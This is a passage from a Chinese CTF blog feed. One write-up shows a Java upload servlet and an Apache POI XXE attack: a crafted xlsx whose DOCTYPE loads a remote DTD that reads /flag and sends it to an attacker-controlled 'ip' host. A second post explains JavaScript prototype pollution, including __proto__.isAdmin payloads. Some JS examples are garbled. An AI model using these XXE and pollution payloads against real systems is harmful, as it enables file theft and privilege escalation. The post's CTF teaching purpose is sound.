class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.abc.servlet;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.PrintStream;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.UUID;<br><span class="hljs-keyword">import</span> javax.servlet.RequestDispatcher;<br><span class="hljs-keyword">import</span> javax.servlet.ServletContext;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.FileItem;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.FileUploadException;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItemFactory;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.servlet.ServletFileUpload;<br><span class="hljs-keyword">import</span> org.apache.poi.openxml4j.exceptions.InvalidFormatException;<br><span class="hljs-keyword">import</span> org.apache.poi.ss.usermodel.Sheet;<br><span class="hljs-keyword">import</span> org.apache.poi.ss.usermodel.Workbook;<br><span class="hljs-keyword">import</span> org.apache.poi.ss.usermodel.WorkbookFactory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UploadServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span><br>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br>    <span class="hljs-keyword">throws</span> ServletException, IOException<br>  &#123;<br>    doPost(request, response); &#125;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">savePath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">tempPath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/temp&quot;</span>);<br>    <span class="hljs-type">File</span> <span class="hljs-variable">tempFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(tempPath);<br>    <span class="hljs-keyword">if</span> (!(tempFile.exists()))<br>      tempFile.mkdir();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-type">DiskFileItemFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DiskFileItemFactory</span>();<br>      factory.setSizeThreshold(<span class="hljs-number">102400</span>);<br>      factory.setRepository(tempFile);<br>      <span class="hljs-type">ServletFileUpload</span> <span class="hljs-variable">upload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletFileUpload</span>(factory);<br><br>      upload.setHeaderEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>      upload.setFileSizeMax(<span class="hljs-number">1048576L</span>);<br>      upload.setSizeMax(<span class="hljs-number">10485760L</span>);<br>      <span class="hljs-keyword">if</span> (!(ServletFileUpload.isMultipartContent(request)))<br>        <span class="hljs-keyword">return</span>;<br>      <span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> upload.parseRequest(request);<br>      <span class="hljs-type">Iterator</span> <span class="hljs-variable">localIterator</span> <span class="hljs-operator">=</span> list.iterator();<br>      <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123; FileItem fileItem;<br>        String filename;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123; <span class="hljs-keyword">do</span> &#123; String str;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123; <span class="hljs-keyword">if</span> (!(localIterator.hasNext())) <span class="hljs-keyword">break</span> label438; fileItem = (FileItem)localIterator.next();<br>              <span class="hljs-keyword">if</span> (!(fileItem.isFormField())) <span class="hljs-keyword">break</span>;<br>              <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> fileItem.getFieldName();<br>              str = fileItem.getString(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            &#125;<br><br>            filename = fileItem.getName(); &#125;<br>          <span class="hljs-keyword">while</span> (filename == <span class="hljs-literal">null</span>); <span class="hljs-keyword">if</span> (!(filename.trim().equals(<span class="hljs-string">&quot;&quot;</span>))) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileExtName</span> <span class="hljs-operator">=</span> filename.substring(filename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> fileItem.getInputStream();<br>        <span class="hljs-keyword">if</span> ((filename.startsWith(<span class="hljs-string">&quot;excel-&quot;</span>)) &amp;&amp; (<span class="hljs-string">&quot;xlsx&quot;</span>.equals(fileExtName)))<br>          <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Workbook</span> <span class="hljs-variable">wb1</span> <span class="hljs-operator">=</span> WorkbookFactory.create(in);<br>            <span class="hljs-type">Sheet</span> <span class="hljs-variable">sheet</span> <span class="hljs-operator">=</span> wb1.getSheetAt(<span class="hljs-number">0</span>);<br>            System.out.println(sheet.getFirstRowNum());<br>          &#125; <span class="hljs-keyword">catch</span> (InvalidFormatException e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);<br>            e.printStackTrace();<br>          &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">saveFilename</span> <span class="hljs-operator">=</span> makeFileName(filename);<br>        request.setAttribute(<span class="hljs-string">&quot;saveFilename&quot;</span>, saveFilename);<br>        request.setAttribute(<span class="hljs-string">&quot;filename&quot;</span>, filename);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">realSavePath</span> <span class="hljs-operator">=</span> makePath(saveFilename, savePath);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(realSavePath + <span class="hljs-string">&quot;/&quot;</span> + saveFilename);<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ((len = in.read(buffer)) &gt; <span class="hljs-number">0</span>)<br>          out.write(buffer, <span class="hljs-number">0</span>, len);<br>        in.close();<br>        out.close();<br>        label438: message = <span class="hljs-string">&quot;文件上传成功!&quot;</span>;<br>      &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (FileUploadException e) &#123;<br>      e.printStackTrace();<br>    &#125;<br>    request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, message);<br>    request.getRequestDispatcher(<span class="hljs-string">&quot;/ListFileServlet&quot;</span>).forward(request, response); &#125;<br><br>  <span class="hljs-keyword">private</span> String <span class="hljs-title function_">makeFileName</span><span class="hljs-params">(String filename)</span> &#123;<br>    <span class="hljs-keyword">return</span> UUID.randomUUID().toString() + <span class="hljs-string">&quot;_&quot;</span> + filename; &#125;<br><br>  <span class="hljs-keyword">private</span> String <span class="hljs-title function_">makePath</span><span class="hljs-params">(String filename, String savePath)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> filename.hashCode();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir1</span> <span class="hljs-operator">=</span> hashCode &amp; <span class="hljs-number">0xF</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir2</span> <span class="hljs-operator">=</span> (hashCode &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> savePath + <span class="hljs-string">&quot;/&quot;</span> + dir1 + <span class="hljs-string">&quot;/&quot;</span> + dir2;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(dir);<br>    <span class="hljs-keyword">if</span> (!(file.exists()))<br>      file.mkdirs();<br>    <span class="hljs-keyword">return</span> dir;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从<code>UploadServlet.class</code>可以关注到如下关键代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> ((filename.startsWith(<span class="hljs-string">&quot;excel-&quot;</span>)) &amp;&amp; (<span class="hljs-string">&quot;xlsx&quot;</span>.equals(fileExtName)))<br>          <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Workbook</span> <span class="hljs-variable">wb1</span> <span class="hljs-operator">=</span> WorkbookFactory.create(in);<br>            <span class="hljs-type">Sheet</span> <span class="hljs-variable">sheet</span> <span class="hljs-operator">=</span> wb1.getSheetAt(<span class="hljs-number">0</span>);<br>            System.out.println(sheet.getFirstRowNum());<br>          &#125; <span class="hljs-keyword">catch</span> (InvalidFormatException e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);<br>            e.printStackTrace();<br>          &#125;<br></code></pre></td></tr></table></figure><p>其中<code>Apache POI XML外部实体攻击()</code>相关对应漏洞版本为<code>poi-ooxml-3.10-FINAL.jar及以下版本</code>，并且也是针对<code>Office</code>的攻击，于是可以进行尝试。创建名为<code>excel-1.xlsx</code>的文件，修改后缀为<code>zip</code>,使用<code>winrar</code>进行解压，修改<code>[Content-Types].xml</code>文件，在第2行添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip:8001/file.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;%int;%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>然后将文件重新压缩，并改后缀为<code>xlsx</code></p><p>接着使用<code>python3</code>起一个HTTP服务<code>python -m http.server 8001</code>开启HTTP服务，并放置<code>file.dtd</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:8989?p=%file;&#x27;&gt;&quot;&gt;<br>%int;<br>%send;<br></code></pre></td></tr></table></figure><p>开启监听，上传xlsx文件</p><pre><code class="hljs">如果你有任何其他需求或需要进一步的解释，请告诉我。</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>ssrf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js原型链污染</title>
    <link href="/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<h3 id="JS基础数据类型："><a href="#JS基础数据类型：" class="headerlink" title="JS基础数据类型："></a>JS基础数据类型：</h3><ol><li><strong>基本数据类型</strong>:<ul><li><code>String</code></li><li><code>Number</code></li><li><code>Boolean</code></li><li><code>Null</code></li><li><code>Undefined</code></li><li><code>Symbol</code></li></ul></li><li><strong>引用类型</strong>:<ul><li><code>Object</code></li><li><code>Array</code></li><li><code>Function</code></li></ul></li></ol><h3 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义:"></a>变量定义:</h3><ul><li><p><strong>变量定义的例子</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> car = <span class="hljs-string">&#x27;A&#x27;</span>; <span class="hljs-comment">// 定义字符串</span><br><span class="hljs-keyword">var</span> car = <span class="hljs-string">&#x27;B&#x27;</span>; <span class="hljs-comment">// 另一个字符串</span><br><span class="hljs-keyword">var</span> x = <span class="hljs-number">3.0</span>;   <span class="hljs-comment">// 定义数字</span><br><span class="hljs-keyword">var</span> is = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 定义布尔值</span><br></code></pre></td></tr></table></figure></li><li><p><strong>数组定义</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> cars = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>();<br>cars[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;A&quot;</span>; <span class="hljs-comment">// 直接赋值</span><br><br><span class="hljs-keyword">var</span> cars = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>); <span class="hljs-comment">// 使用Array构造函数定义</span><br><br><span class="hljs-keyword">var</span> cars = [<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>]; <span class="hljs-comment">// 使用字面量定义数组</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="对象定义："><a href="#对象定义：" class="headerlink" title="对象定义："></a>对象定义：</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> person = &#123;<span class="hljs-attr">first</span>: <span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-attr">last</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-attr">score</span>: <span class="hljs-string">&quot;C&quot;</span>&#125;; <span class="hljs-comment">// 定义对象</span><br></code></pre></td></tr></table></figure><p>通过对象进行属性访问:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">name = person.<span class="hljs-property">first</span>; <span class="hljs-comment">// 访问对象的属性</span><br>name = person[<span class="hljs-string">&quot;first&quot;</span>]; <span class="hljs-comment">// 另一种方式访问 (类似 Python)</span><br></code></pre></td></tr></table></figure><h3 id="函数定义："><a href="#函数定义：" class="headerlink" title="函数定义："></a>函数定义：</h3><ul><li><p><strong>传统函数定义</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">xx</span>(<span class="hljs-params">a, c</span>) &#123;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>匿名函数赋值</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> xx = <span class="hljs-keyword">function</span>(<span class="hljs-params">a, c</span>) &#123;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p><strong>箭头函数</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> <span class="hljs-title function_">xx</span> = (<span class="hljs-params">a, c</span>) =&gt; &#123;&#125;;<br></code></pre></td></tr></table></figure></li></ul><h3 id="加法操作符的使用："><a href="#加法操作符的使用：" class="headerlink" title="加法操作符的使用："></a>加法操作符的使用：</h3><p>除了number+number和bool和bool其余返回string</p><ul><li><p><strong>数字与字符串的拼接</strong>：</p><ul><li>数字加数字：<code>1 + 1 = 2</code></li><li>字符串加字符串：<code>&quot;abc&quot; + &quot;def&quot; = &quot;abcdef&quot;</code></li><li>字符串加数字：<code>&quot;abc&quot; + 1 = &quot;abc1&quot;</code></li><li>字符串加对象:     “uert”+{person:’abc’}&#x3D;uert{person:’abc’}</li><li>对象加对象：<code>[Object Object]</code> 拼接结果</li><li>字符串加数组: “uert”+[“abc”,”efg”]&#x3D;”uertabc”,”efg”</li><li>字符串加null: “uert”+null&#x3D; “uertnull”  同理true和false</li></ul><p> Python 里面不能像 JS 这样混合不同类型的数据来做拼接，但 JS 是可以的。</p></li><li><p><strong>其他运算符</strong>:</p><ul><li>fuc+fuc&#x3D;”(a,b)&#x3D;&gt;{return(a+b)}(a,b)&#x3D;&gt;{return(a+b)}”</li><li>arr+arr&#x3D;”abc,efgabc,abc”</li><li>arr+true&#x3D; “abc,deftrue”</li></ul></li></ul><h3 id="非字符串与非字符串的操作："><a href="#非字符串与非字符串的操作：" class="headerlink" title="非字符串与非字符串的操作："></a>非字符串与非字符串的操作：</h3><ul><li><code>true + true = 2</code></li><li><code>false + false = 0</code></li></ul><h3 id="函数的简写："><a href="#函数的简写：" class="headerlink" title="函数的简写："></a>函数的简写：</h3><ul><li>使用箭头函数：<code>(a, b) =&gt; &#123;return (a + b)&#125;</code> 和 <code>arr + true = abc.deftrue</code>。</li></ul><h3 id="长度属性："><a href="#长度属性：" class="headerlink" title="长度属性："></a>长度属性：</h3><ul><li><p><strong>String 的长度</strong>:</p><ul><li><code>string.length</code> 返回字符串的字符数。</li></ul></li><li><p><strong>Array 的长度</strong>:</p><ul><li><code>Array.length</code> 返回数组的元素个数。</li></ul></li><li><p>还提到 <code>number 没有 length</code> 属性。</p></li></ul><h3 id="JSON-解析："><a href="#JSON-解析：" class="headerlink" title="JSON 解析："></a>JSON 解析：</h3><ul><li>使用 <code>JSON.parse()</code> 可以将 JSON 字符串转化为对象。</li><li>注意到你提到 <code>JSON.parse(null)</code> 会返回 <code>null</code>。</li></ul><h3 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h3><ul><li>使用 <code>in</code> 可以遍历对象的属性。</li><li>在最右侧提到 <code>这里指的是数字</code>。</li></ul><h1 id="js-trick"><a href="#js-trick" class="headerlink" title="js   trick"></a>js   trick</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">NaN==NaN</span><br>&lt;false<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">NaN==NaN</span><br>&lt;false<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash"><span class="hljs-literal">false</span>==<span class="hljs-string">&#x27;0&#x27;</span></span><br>&lt;ture<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0==<span class="hljs-string">&#x27;0&#x27;</span></span><br>&lt;true<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0==<span class="hljs-literal">false</span></span><br>&lt;true<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1e-1234 //整数的负大数次方为0</span><br>&lt;0<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">-1e-1234 //负数的负大数次方为-0</span><br>&lt;-0<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0===-0</span><br>&lt;true<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1337/0</span><br>&lt;无穷<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1337/-0</span><br>&lt;负无穷<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">负无穷==正无穷</span><br>&lt;false<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">e=-1</span><br>&lt;-1<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">!e++</span><br>&lt;false<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">!e--</span><br>&lt;true<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">!<span class="hljs-string">&#x27;0&#x27;</span>  //例子 f==!f  f是<span class="hljs-string">&quot;0&quot;</span>就行</span><br>&lt;false<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">!<span class="hljs-string">&#x27;&#x27;</span></span>   <br>&lt;true<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">a=[<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;hello&quot;</span>]</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">a[<span class="hljs-string">&quot;name&quot;</span>]</span><br>&lt;&#x27;hello&#x27;<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">a[[<span class="hljs-string">&quot;name&quot;</span>]]</span><br>&lt;&#x27;hello&#x27;<br></code></pre></td></tr></table></figure><h1 id="类型污染"><a href="#类型污染" class="headerlink" title="类型污染"></a>类型污染</h1><p>first !&#x3D;&#x3D; second &amp;&amp; shal(salt + frist) &#x3D;&#x3D;&#x3D; shal(salt + second)</p><p>POST : {“frist” : “A” “second”: [“A”]}</p><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">Function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;...&#125;;<br>let f1 = <span class="hljs-keyword">new</span> Foo();<br>解释：<br>每个函数都有一个 prototype 属性，指向一个对象，这个对象包含该构造函数所有实例共享的方法和属性。<br>每个对象有一个 __proto__ 属性，指向创建该对象的构造函数的 prototype。<br>let foo = &#123;<span class="hljs-attr">bar</span>:<span class="hljs-number">1</span>&#125;;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(foo.bar); <span class="hljs-comment">//1</span><br>foo.__proto__.bar=<span class="hljs-number">2</span>; <span class="hljs-comment">//把foo的原型object</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(foo.bar); <span class="hljs-comment">//还是1</span><br>let zoo=&#123;&#125;;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(zoo.bar); <span class="hljs-comment">//结果是&#123;&#125;而不是2</span><br>我.uert=张三<br>除非我里面没有张三,才是张铁柱<br>该爹法<br>val.__proto__.isAdmin = <span class="hljs-literal">true</span><br>换爹法<br>val.__proto__=&#123;<span class="hljs-string">&#x27;isAdmin&#x27;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p><strong>举例说明：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello, &quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-keyword">let</span> john = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;John&quot;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(john.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br>john.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// &quot;Hello, John&quot;</span><br></code></pre></td></tr></table></figure><p>在这个例子中：</p><ul><li><code>john</code> 是通过 <code>new Person()</code> 创建的对象。</li><li><code>john.__proto__</code> 指向 <code>Person.prototype</code>，它包含 <code>sayHello</code> 方法。</li><li>当你调用 <code>john.sayHello()</code> 时，JavaScript 引擎会沿着 <code>__proto__</code> 查找这个方法，最终在 <code>Person.prototype</code> 上找到并执行。</li></ul><h1 id="原型链图解"><a href="#原型链图解" class="headerlink" title="原型链图解"></a>原型链图解</h1><h3 id="JavaScript-原型链的核心概念："><a href="#JavaScript-原型链的核心概念：" class="headerlink" title="JavaScript 原型链的核心概念："></a>JavaScript 原型链的核心概念：</h3><ol><li><strong>每个对象都有一个隐式原型（<code>__proto__</code>）</strong>：<ul><li>当你创建一个对象时，该对象会有一个隐式原型指向它的构造函数的 <code>prototype</code> 属性。</li></ul></li><li><strong>构造函数与 <code>prototype</code> 属性</strong>：<ul><li>每个函数都有一个显式原型属性（<code>prototype</code>），这个属性指向通过这个构造函数创建的实例对象的原型。</li></ul></li><li>**对象的 <code>__proto__</code> 指向构造函数的 <code>prototype</code>**：<ul><li>例如，<code>let obj = new Foo();</code> 中，<code>obj.__proto__ === Foo.prototype</code>。即 <code>obj</code> 的原型指向了 <code>Foo</code> 构造函数的 <code>prototype</code>。</li></ul></li><li><strong>构造函数本身也是对象</strong>：<ul><li>所以构造函数 <code>Foo</code> 也是由 <code>Function</code> 构造出来的，它有一个 <code>__proto__</code>，指向 <code>Function.prototype</code>。</li></ul></li><li>**终点是 <code>null</code>**：<ul><li>原型链的终点是 <code>null</code>，即 <code>Object.prototype.__proto__ === null</code>。</li></ul></li></ol><h3 id="更详细的图形说明："><a href="#更详细的图形说明：" class="headerlink" title="更详细的图形说明："></a>更详细的图形说明：</h3><ul><li><strong>Foo 对象实例</strong>：<ul><li><code>foo.__proto__ -&gt; Foo.prototype</code></li></ul></li><li><strong>Foo 构造函数</strong>：<ul><li><code>Foo.__proto__ -&gt; Function.prototype</code></li></ul></li><li><strong>Function 构造函数</strong>：<ul><li><code>Function.__proto__ -&gt; Function.prototype</code></li><li><code>Function.prototype.__proto__ -&gt; Object.prototype</code></li></ul></li><li><strong>Object 构造函数</strong>：<ul><li><code>Object.__proto__ -&gt; Function.prototype</code></li><li><code>Object.prototype.__proto__ -&gt; null</code></li></ul></li></ul><p>这个层次结构可以这样看：</p><ul><li><strong>Foo 的实例</strong>：继承自 <code>Foo.prototype</code></li><li><strong>Foo.prototype</strong>：继承自 